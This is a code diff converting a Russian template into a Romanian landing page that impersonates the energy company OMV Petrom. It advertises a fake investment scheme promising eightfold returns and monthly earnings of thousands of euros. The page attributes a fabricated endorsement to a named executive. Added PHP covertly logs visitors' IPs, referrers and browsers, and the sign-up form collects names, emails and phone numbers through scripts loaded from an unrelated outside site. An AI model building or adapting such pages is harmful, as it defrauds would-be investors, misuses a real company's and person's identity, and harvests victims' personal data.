@@ -1,10 +1,28 @@
+<?php
+$FacebookPixel = $_GET['px'];
+$Ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+$http_lang = substr($_SERVER["HTTP_ACCEPT_LANGUAGE"],0,2);
+$fd = fopen("logs.txt", 'a+');
+$date = date('d.m.Y, H:i:s');
+$arr = $date.'|'.$_SERVER['HTTP_CF_IPCOUNTRY'].'|'.$http_lang.'|'.$_SERVER['HTTP_REFERER'].'|'.$_SERVER['HTTP_USER_AGENT'].'|'.$Ip."|land \r\n";
+fwrite($fd, $arr);
+fclose($fd);
+$gp = $_GET['gp'];
+$hs = $_GET['hs'];
+$page_lang = "RO";
+$QUERY=$_SERVER["QUERY_STRING"];
+
+
+?>
+
+
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="ro">
   <head>
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Document</title>
+    <title>OMV Petrom</title>
     <link rel="stylesheet" href="./css/main.min.css" />
     <link
       rel="stylesheet"
@@ -19,6 +37,8 @@
       href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap"
       rel="stylesheet"
     />
+    <link rel="stylesheet" href="https://usahomerelief.net/adict/intlTelInput.css" />
+    <link rel="stylesheet" href="https://usahomerelief.net/adict/adict.css" />
   </head>
   <body>
     <header class="header">
@@ -51,15 +71,29 @@
         </a>
         <nav class="header_navbar">
           <ul class="header_navbar-list">
-            <li class="header_navbar-item"><a class="header_navbar-item-text" href="#">О компании</a></li>
-            <li class="header_navbar-item"><a  class="header_navbar-item-text" href="#">Новости</a></li>
-            <li class="header_navbar-item"><a  class="header_navbar-item-text" href="#">Карьера</a></li>
-            <li class="header_navbar-item"><a  class="header_navbar-item-text" href="#">СМИ</a></li>
-            <li class="header_navbar-item"><a  class="header_navbar-item-text" href="#">Контакты</a></li>
+            <li class="header_navbar-item">
+              <a class="header_navbar-item-text" href="#form">! Despre companiei</a>
+            </li>
+            <li class="header_navbar-item">
+              <a class="header_navbar-item-text" href="#form">Știri</a>
+            </li>
+            <li class="header_navbar-item">
+              <a class="header_navbar-item-text" href="#form">Carieră</a>
+            </li>
+            <li class="header_navbar-item">
+              <a class="header_navbar-item-text" href="#form">Mass media</a>
+            </li>
+            <li class="header_navbar-item">
+              <a class="header_navbar-item-text" href="#form">Contacte</a>
+            </li>
           </ul>
         </nav>
-        <button class="header_registrations">Регистрация</button>
-        <button class="header_burger">
+        <button class="header_registrations">Înregistrare</button>
+        <button
+          aria-expanded="false"
+          aria-controls="mobile-menu"
+          class="header_burger js-open-menu"
+        >
           <svg
             width="36"
             height="36"
@@ -76,65 +110,77 @@
       </div>
     </header>
     <main>
-      <section class="hero">
+      <section id="about" class="hero">
         <div class="container hero_container">
-         <div class="hero_description">
-          <h1 class="hero_title"><span>Зарабатывай</span> на природных ресурсах страны</h1>
-          <p class="hero_text">
-            <span>Получай доход</span> благодаря <br class="mobile" />
-            инвестициям в<br class="desktop" />
-            самую большую нефтегазовою корпорацию страны!
-          </p>
-       <div class="hero_wrapper-button"><button class="hero_button">Начать заробатывать</button>
-      <button class="hero_play">Смотреть видео</button></div>
-        </div>
-        <div class="hero_player">
-          <p class="hero_player-text">Посомтри видеопрезентацию.
-          Ты поймешь почему это выгодно.</p>
-          <button class="hero_player-button"><img src="./images/desktop/play_button.png" alt=""></button>
-        </div>
+          <div class="hero_description">
+            <h1 class="hero_title"><span>Câștigă</span> din resursele naturale ale țării</h1>
+            <p class="hero_text">
+              <span>Câștigați venituri</span> investind <br class="mobile" />
+              în cea<br class="desktop" />
+              mai mare corporație de petrol și gaze din țară.
+            </p>
+            <div class="hero_wrapper-button"><button class="hero_button">Începe să câștigi</button>
+              <button class="hero_play">Privește videoclipul</button>
+            </div>
+          </div>
+          <div class="hero_player">
+            <p class="hero_player-text">Urmărește prezentarea video.
+              Vei înțelege de ce este profitabil.</p>
+            <button class="hero_player-button"><img src="./images/desktop/play_button.png" alt=""></button>
+          </div>
+          </div>
       </section>
       <section class="about">
         <div class="container about_container">
-          <div class="wrapper_form">
-            <p class="form-text">регистрация</p>
+          <div id="form" class="wrapper_form">
+            <p class="form-text">Înregistrare</p>
 
             <form action="" class="form">
-              <label class="form-label"><input class="form-input" type="text" /></label>
-              <label class="form-label"><input class="form-input" type="text" /></label>
-              <label class="form-label"><input class="form-input" type="text" /></label>
-              <label class="form-label"><input class="form-input" type="text" /></label>
-              <button class="form-button">Оставить заявку</button>
+              <label class="form-label"><input class="form-input" type="text" name="f_name" placeholder="Nume" required="" /></label>
+              <label class="form-label"><input class="form-input" type="text" name="l_name" placeholder="Denumire" required="" /></label>
+              <label class="form-label"><input class="form-input" type="email" name="email" placeholder="E-mail" required="" /></label>
+              <label class="form-label"><input class="form-input" type="tel"  required="" /></label>
+              <input type="hidden" name="phone2" class="phone2" autocomplete="off" required />
+              <input type="hidden" name="pixel_id" value="<?php echo $FacebookPixel?>" />
+              <input type="hidden" name="page_lang" value="<?php echo $page_lang?>" />
+              <input type="hidden" name="query" value="<?php echo $QUERY?>" />
+              <input type="hidden" name="gp_id" value="<?php echo $gp?>" />
+              <input type="hidden" name="hs_id" value="<?php echo $hs?>" />
+              <input type="hidden" name="ip" id="ip" />
+              <input type="hidden" name="landing" value="OMV-Petrom" />
+              <input type="hidden" name="description" value="OMV-Petrom" />
+              <input type="hidden" name="add_inputs" id="desc" value="" />
+              <button class="form-button">Trimiteți cererea dumneavoastră</button>
             </form>
           </div>
-         <div class="about_wrapper-list">
-          <ul class="about_list">
-            <li class="about_list-item">
-              <img class="about_image" width="68" height="69" src="./images/about_1.png" alt="" />
-              <p class="about_list-text">
-                Система способна увеличить отдачу в 8 раз от вложенной суммы
-              </p>
-            </li>
-            <li class="about_list-item">
-              <img class="about_image" width="68" height="69" src="./images/about_2.png" alt="" />
-              <p class="about_list-text">
-                Более 1345 участников смогли получить доход в первый же день
-              </p>
-            </li>
-            <li class="about_list-item">
-              <img class="about_image" width="68" height="69" src="./images/about_3.png" alt="" />
-              <p class="about_list-text">Быстрый возврат инвестиций удобным для вас способом</p>
-            </li>
-            <li class="about_list-item">
-              <img class="about_image" width="68" height="69" src="./images/about_4.png" alt="" />
-              <p class="about_list-text">алгоритмы автоматизированны на 100% как автопилот</p>
-            </li>
-           
-          
-          </ul>
-          <p class="about_description">Благодаря новой уникальной платформе мы станем европейским лидером в областе производства
-            энергии.</p>
-         </div>
+          <div class="about_wrapper-list">
+            <ul class="about_list">
+              <li class="about_list-item">
+                <img class="about_image" width="68" height="69" src="./images/about_1.png" alt="" />
+                <p class="about_list-text">
+                Sistemul este capabil să mărească rentabilitatea de 8 ori mai mare decât suma investită
+                </p>
+              </li>
+              <li class="about_list-item">
+                <img class="about_image" width="68" height="69" src="./images/about_2.png" alt="" />
+                <p class="about_list-text">
+                  Peste 1345 de participanți au primit venituri în prima zi
+                </p>
+              </li>
+              <li class="about_list-item">
+                <img class="about_image" width="68" height="69" src="./images/about_3.png" alt="" />
+                <p class="about_list-text">Rentabilitatea rapidă a investiției într-un mod convenabil pentru dumneavoastră</p>
+              </li>
+              <li class="about_list-item">
+                <img class="about_image" width="68" height="69" src="./images/about_4.png" alt="" />
+                <p class="about_list-text">Algoritmii sun 100% automatizați ca un pilot automat</p>
+              </li>
+            </ul>
+            <p class="about_description">
+              Noua platformă unică ne va transforma în lider european în domeniul
+              de producție de energie.
+            </p>
+          </div>
         </div>
       </section>
       <section class="manager">
@@ -142,27 +188,34 @@
           <img class="manager_img" src="./images/mobile/face_1.jpg" alt="" />
           <div class="manager_description">
             <h3 class="manager_description-title">
-              «ИНГ. ПАВЕЛ СИРАНИ , MBA ЗАМЕСТИТЕЛЬ ПРЕДСЕДАТЕЛЯ СОВЕТА ДИРЕКТОРОВ»
+            Christina Verchere (1971) – Director General Executiv și Președinte al Directoratului
             </h3>
             <p class="manager_description-text">
-              «Этот общественный проект позволит всем гражданам Чехии инвестировать, потому что
-              спрос на чистую энергию растет с каждым днем. Наша цель — привлечь инвесторов со всей
-              страны, чтобы компания реализовала свою стратегию, а инвесторы имели возможность
-              зарабатывать дополнительно от 3 800 до 19 700 евро в месяц».
+              «Acest proiect public va permite tuturor cetățenilor României să câștige din investiții, deoarece cererea de energie
+              crește în fiecare zi. Scopul nostru este să atragem investitori din toată țara, astfel încât compania să-și implementeze
+              strategia, iar investitorii să aibă posibilitatea de a câștiga suplimentar între 3800 șu 19700 de euro pe lună.
+              Stabilitatea economică a cetățeanului este în fruntea proiectului Petrom-Income. Investițiile în proiect pentru prima
+              săptămână se ridică la peste 930000 de euro».
             </p>
-            <button class="button-money">Начать заробатывать</button>
-           
+            <button class="button-money">Începe să câștigi</button>
           </div>
-          
         </div>
         <div class="video">
           <button class="video_button">
-            <svg class="video_svg" width="36" height="36" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <svg
+              class="video_svg"
+              width="36"
+              height="36"
+              viewBox="0 0 36 36"
+              fill="none"
+              xmlns="http://www.w3.org/2000/svg"
+            >
               <g clip-path="url(#clip0_13_78)">
                 <circle cx="18" cy="18" r="18" fill="#FFEB00" />
                 <path
                   d="M36 18C36 22.7739 34.1036 27.3523 30.7279 30.7279C27.3523 34.1036 22.7739 36 18 36C13.2261 36 8.64773 34.1036 5.27208 30.7279C1.89642 27.3523 0 22.7739 0 18C0 13.2261 1.89642 8.64773 5.27208 5.27208C8.64773 1.89642 13.2261 0 18 0C22.7739 0 27.3523 1.89642 30.7279 5.27208C34.1036 8.64773 36 13.2261 36 18ZM15.2775 11.4592C15.1093 11.3395 14.9113 11.2683 14.7054 11.2536C14.4994 11.2388 14.2933 11.281 14.1098 11.3756C13.9262 11.4702 13.7722 11.6135 13.6646 11.7897C13.5571 11.966 13.5001 12.1685 13.5 12.375V23.625C13.5001 23.8315 13.5571 24.034 13.6646 24.2103C13.7722 24.3865 13.9262 24.5298 14.1098 24.6244C14.2933 24.719 14.4994 24.7612 14.7054 24.7464C14.9113 24.7317 15.1093 24.6605 15.2775 24.5407L23.1525 18.9157C23.2983 18.8117 23.4172 18.6743 23.4992 18.515C23.5812 18.3557 23.624 18.1792 23.624 18C23.624 17.8208 23.5812 17.6443 23.4992 17.485C23.4172 17.3257 23.2983 17.1883 23.1525 17.0842L15.2775 11.4592Z"
-                  fill="#003366" />
+                  fill="#003366"
+                />
                 <circle cx="18" cy="18" r="17" stroke="white" stroke-width="2" />
               </g>
               <defs>
@@ -176,7 +229,7 @@
       </section>
       <section class="project">
         <div class="container">
-          <h2 class="project_title">наши проекты</h2>
+          <h2 class="project_title">Proiectele noastre</h2>
 
           <ul class="project_list">
             <li class="project_list-item">
@@ -188,9 +241,9 @@
                     src="./images/mobile/gas_1.jpg"
                     alt=""
                   />
-                  <h4 class="project_item-title">НЕФТЕДОБЫВАЮЩИЕ СТАНЦИИ</h4>
+                  <h4 class="project_item-title">STAȚII DE REPRODUCERE DE PETROL</h4>
                 </div>
-                <p class="project_item-text">Минимальная инвестиция 200 EUR</p>
+                <p class="project_item-text">Investigația minimă 250 EUR</p>
               </a>
             </li>
             <li class="project_list-item">
@@ -202,9 +255,9 @@
                     src="./images/mobile/gas_2.jpg"
                     alt=""
                   />
-                  <h4 class="project_item-title">НЕФТЕПРОВОД</h4>
+                  <h4 class="project_item-title">CONDUCTE</h4>
                 </div>
-                <p class="project_item-text">Минимальная инвестиция 200 EUR</p>
+                <p class="project_item-text">Investiția minimă 200 EUR</p>
               </a>
             </li>
             <li class="project_list-item">
@@ -217,51 +270,51 @@
                     alt=""
                   />
                   <h4 class="project_item-title">
-                    ЗАПРАВОЧНЫЕ <br />
-                    СТАНЦИИ
+                    STAȚII DE  <br />
+                    COMBUSTIBILE
                   </h4>
                 </div>
-                <p class="project_item-text">Минимальная инвестиция 200 EUR</p>
+                <p class="project_item-text">Investiția minimă 200 EUR</p>
               </a>
             </li>
           </ul>
-          <h2 class="project_title project_title-second">как начать инвестировать?</h2>
+          <h2 class="project_title project_title-second">Cum să începi să investești?</h2>
           <ul class="project_list-second">
             <li class="project_list-second-item">
               <div class="project_list-second-number">1</div>
-              <h4 class="project_list-second-title">Получите бесплатную консультацию</h4>
-              <p class="project_list-second-text">Оставьте заявку на консультацию онлайн</p>
+              <h4 class="project_list-second-title">Obțineți o consultație gratuită</h4>
+              <p class="project_list-second-text">Lăsați o cerere pentru o consultație online</p>
             </li>
             <li class="project_list-second-item">
               <div class="project_list-second-number">2</div>
-              <h4 class="project_list-second-title">Подписание контракта с OMV PETROM</h4>
+              <h4 class="project_list-second-title">Semnarea unui contract cu agentul managerului</h4>
               <p class="project_list-second-text">
-                Телефонный просмотр списка документов с консультантом
+                Revizuirea telefonică a listei de documente cu un consultant
               </p>
             </li>
             <li class="project_list-second-item">
               <div class="project_list-second-number">3</div>
-              <h4 class="project_list-second-title">Открытие счета</h4>
-              <p class="project_list-second-text">Внесите достаточно денег, чтобы купить акции</p>
+              <h4 class="project_list-second-title">Deschiderea contului</h4>
+              <p class="project_list-second-text">Depuneți suficienți bani pentru a cumpăra acțiuni</p>
             </li>
             <li class="project_list-second-item">
               <div class="project_list-second-number">4</div>
-              <h4 class="project_list-second-title">Инвестировать</h4>
-              <p class="project_list-second-text">Через личный кабинет на платформе</p>
+              <h4 class="project_list-second-title">Investiți</h4>
+              <p class="project_list-second-text">Print-un cont personal pe platformă</p>
             </li>
           </ul>
         </div>
       </section>
       <section class="pre_footer">
         <div class="wrapper_form">
-          <p class="form-text">регистрация</p>
+          <p class="form-text">Înregistrare</p>
 
           <form action="" class="form">
             <label class="form-label"><input class="form-input" type="text" /></label>
             <label class="form-label"><input class="form-input" type="text" /></label>
             <label class="form-label"><input class="form-input" type="text" /></label>
             <label class="form-label"><input class="form-input" type="text" /></label>
-            <button class="form-button">Оставить заявку</button>
+            <button class="form-button">Trimiteți cererea dumneavoastră</button>
           </form>
         </div>
         <img src="./images/mobile/footer.jpg" alt="" />
@@ -294,5 +347,41 @@
       </svg>
       <p class="footer_firma">© Copyright OMV Petrom 2022</p>
     </footer>
+    <!-- ------------MOBILE MENU-------------- -->
+    <div class="menu-container js-menu-container" id="mobile-menu">
+      <button type="button" class="menu-toogle js-close-menu">
+        <svg
+          fill="#000000"
+          xmlns="http://www.w3.org/2000/svg"
+          viewBox="0 0 50 50"
+          width="50px"
+          height="50px"
+        >
+          <path
+            d="M 25 2 C 12.309534 2 2 12.309534 2 25 C 2 37.690466 12.309534 48 25 48 C 37.690466 48 48 37.690466 48 25 C 48 12.309534 37.690466 2 25 2 z M 25 4 C 36.609534 4 46 13.390466 46 25 C 46 36.609534 36.609534 46 25 46 C 13.390466 46 4 36.609534 4 25 C 4 13.390466 13.390466 4 25 4 z M 32.990234 15.986328 A 1.0001 1.0001 0 0 0 32.292969 16.292969 L 25 23.585938 L 17.707031 16.292969 A 1.0001 1.0001 0 0 0 16.990234 15.990234 A 1.0001 1.0001 0 0 0 16.292969 17.707031 L 23.585938 25 L 16.292969 32.292969 A 1.0001 1.0001 0 1 0 17.707031 33.707031 L 25 26.414062 L 32.292969 33.707031 A 1.0001 1.0001 0 1 0 33.707031 32.292969 L 26.414062 25 L 33.707031 17.707031 A 1.0001 1.0001 0 0 0 32.990234 15.986328 z"
+          />
+        </svg>
+      </button>
+      <ul class="mobile-menu list">
+        <li class="mobile-menu__item">
+          <a href="#form" class="mobile-menu__link link">! Despre companiei</a>
+        </li>
+        <li class="mobile-menu__item">
+          <a href="#form" class="mobile-menu__link link">Știri</a>
+        </li>
+        <li class="mobile-menu__item"><a href="#form" class="mobile-menu__link link">Carieră</a></li>
+        <li class="mobile-menu__item"><a href="#form" class="mobile-menu__link link">Mass media</a></li>
+
+        <li class="mobile-menu__item"><a href="#form" class="mobile-menu__link link">Contacte</a></li>
+        <li class="mobile-menu__item"><a href="#form" class="mobile-menu__link link">Înregistrare</a></li>
+      </ul>
+    </div>
+    <script src="https://code.jquery.com/jquery-2.2.4.min.js"
+      integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+    <script src="https://usahomerelief.net/adict/intlTelInput.js"></script>
+    
+    <script src="https://usahomerelief.net/adict/adict.js"></script>
+    <script src="https://usahomerelief.net/adict/utils.js"></script>
+    <script src="./js/main.js"></script>
   </body>
 </html>
